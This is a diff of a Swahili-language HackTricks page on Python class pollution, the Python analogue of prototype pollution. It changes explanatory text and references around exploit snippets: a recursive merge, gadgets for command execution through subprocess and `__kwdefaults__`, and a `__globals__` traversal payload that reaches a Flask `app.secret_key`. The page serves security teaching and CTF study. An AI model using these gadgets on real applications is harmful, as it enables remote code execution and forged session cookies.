@@ -1,10 +1,8 @@
 # Class Pollution (Python's Prototype Pollution)
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ## Mfano wa Msingi
 
-Angalia jinsi inavyowezekana kuchafua classes za objects kwa strings:<sup>[[1]](#references)</sup>
+Kubadilisha `__qualname__` kupitia reference ya class ya instance husasisha class hiyo pamoja na class zake za msingi zinazoweza kubadilishwa.<sup>[[1]](#references)</sup>
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -28,7 +26,9 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-## Mfano wa Msingi wa Udhaifu
+## Mfano wa Msingi wa Athari
+
+A recursive merge inaweza kukubali funguo za mapping zinazodhibitiwa na mshambulizi na kuandika thamani zilizowekwa ndani kupitia ufikiaji wa item au attribute.<sup>[[1]](#references)</sup>
 ```python
 # Initial state
 class Employee: pass
@@ -65,7 +65,9 @@ print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 
 <details>
 
-<summary>Kuunda default value ya class property kwa RCE (subprocess)</summary><sup>[[1]](#references)</sup>
+<summary>Kuunda thamani ya chaguo-msingi ya class property kwa RCE (subprocess)</summary>
+
+Class ya msingi inayoshirikiwa inaweza kutoa attribute ya chaguo-msingi inayotumiwa na command gadget ya sibling class.<sup>[[1]](#references)</sup>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -116,7 +118,9 @@ print(system_admin_emp.execute_command())
 
 <details>
 
-<summary>Kuchafua classes nyingine na vars za global kupitia <code>globals</code></summary><sup>[[1]](#references)</sup>
+<summary>Kuchafua classes nyingine na global vars kupitia <code>globals</code></summary>
+
+Ramani ya `__globals__` ya function hufichua module namespace inayoweza kufikiwa kutoka kwa method iliyofafanuliwa kwenye module hiyo.<sup>[[1]](#references)[[4]](#references)</sup>
 ```python
 def merge(src, dst):
 # Recursive merge function
@@ -148,7 +152,9 @@ print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 
 <details>
 
-<summary>Utekelezaji wa subprocess kiholela</summary><sup>[[1]](#references)</sup>
+<summary>Utekelezaji wa subprocess kiholela</summary>
+
+Kwenye Windows, `Popen(..., shell=True)` hutumia environment variable `COMSPEC` kama shell chaguomsingi, kwa hivyo gadget hii inaonyesha uelekezaji wa amri unaotegemea environment.<sup>[[1]](#references)[[5]](#references)</sup>
 ```python
 import subprocess, json
 
@@ -180,9 +186,9 @@ subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 
 <details>
 
-<summary>Kuandika juu ya <strong><code>__kwdefaults__</code></strong></summary>
+<summary>Kuandika upya <strong><code>__kwdefaults__</code></strong></summary>
 
-**`__kwdefaults__`** ni attribute maalum ya functions zote, kulingana na [documentation](https://docs.python.org/3/library/inspect.html) ya Python, ni “mapping ya thamani zozote za default za parameters za **keyword-only**”. Kuchafua attribute hii hutuwezesha kudhibiti thamani za default za parameters za keyword-only za function, ambazo ni parameters za function zinazokuja baada ya \* au \*args.<sup>[[1]](#references)</sup>
+Python inaandika `__kwdefaults__` kama mapping ya thamani chaguo-msingi za parameters za keyword-only, ambazo hufuata `*` au `*args` katika function definition.<sup>[[4]](#references)</sup> Gadget ifuatayo huandika upya mapping hiyo kupitia function path iliyotiwa pollution.<sup>[[1]](#references)</sup>
 ```python
 from os import system
 import json
@@ -223,34 +229,36 @@ execute() #> Executing echo Polluted
 
 <details>
 
-<summary>Kuandika upya secret ya Flask kati ya files</summary>
+<summary>Kuandika upya siri ya Flask katika mafaili yote</summary>
 
-Kwa hiyo, ikiwa unaweza kufanya class pollution kwenye object iliyofafanuliwa katika file kuu ya python ya web lakini **ambayo class yake imefafanuliwa katika file tofauti** na ile kuu. Kwa sababu ili kufikia \_\_globals\_\_ katika payloads zilizotangulia unahitaji kufikia class ya object au methods za class hiyo, utaweza **kufikia globals katika file hiyo, lakini si katika file kuu**. \
-Kwa hiyo, **hutaweza kufikia global object ya Flask app** iliyofafanua **secret key** katika ukurasa mkuu:<sup>[[1]](#references)</sup>
+Ikiwa class ya object iliyochafuliwa iko katika module tofauti na module ya entry-point ya application, methods zake za `__globals__` mwanzoni hufichua namespace ya module ya class. Traversal kupitia loader na `sys.modules.__main__` inaweza kisha kufikia module ya entry-point na object yake ya Flask `app`.<sup>[[1]](#references)[[2]](#references)</sup>
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-Katika hali hii unahitaji gadget ya kupitia faili ili kufikia faili kuu na **kufikia global object `app.secret_key`** ili kubadilisha secret key ya Flask na kuweza [**kuongeza privileges** ukijua key hii](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
+Flask hutumia `app.secret_key` kusaini session cookie; kujua key hii humruhusu attacker kuunda session data halali.<sup>[[6]](#references)</sup>
 
-Payload kama huu [kutoka kwenye writeup hii](https://ctftime.org/writeup/36082):<sup>[[2]](#references)</sup>
+Maelezo ya awali yanaonyesha njia ifuatayo ya kufikia `app.secret_key`; CTFtime pia ina nakala ya maelezo hayo.<sup>[[2]](#references)[[3]](#references)</sup>
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-Tumia payload hii **kubadilisha `app.secret_key`** (jina katika app yako linaweza kuwa tofauti) ili uweze kusaini Flask cookies mpya zenye privileges zaidi.
+Kubadilisha key kunaweza kuruhusu kusaini replacement session cookies na kunaweza kuwezesha privilege escalation; tazama [ukurasa wa Flask session tooling](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).<sup>[[6]](#references)</sup>
 
 </details>
 
-Angalia pia ukurasa ufuatao kwa gadgets zaidi za read-only:
+Pia angalia ukurasa ufuatao kwa gadgets zaidi za read-only:
 
 
 {{#ref}}
 python-internal-read-gadgets.md
 {{#endref}}
 
-## Marejeleo
+## References
 
-- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
-- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
-
+- [1] [Prototype Pollution katika Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [2] [maandishi ya kazi ya idekCTF 2022 task manager (ya awali)](https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/)
+- [3] [CTFtime - maandishi ya kazi ya idekCTF 2022: task manager](https://ctftime.org/writeup/36082)
+- [4] [inspect — Kukagua objects zinazoendelea kufanya kazi](https://docs.python.org/3/library/inspect.html)
+- [5] [subprocess — Usimamizi wa subprocess](https://docs.python.org/3/library/subprocess.html)
+- [6] [Quickstart — Documentation ya Flask](https://flask.palletsprojects.com/en/stable/quickstart/)
 {{#include ../../banners/hacktricks-training.md}}
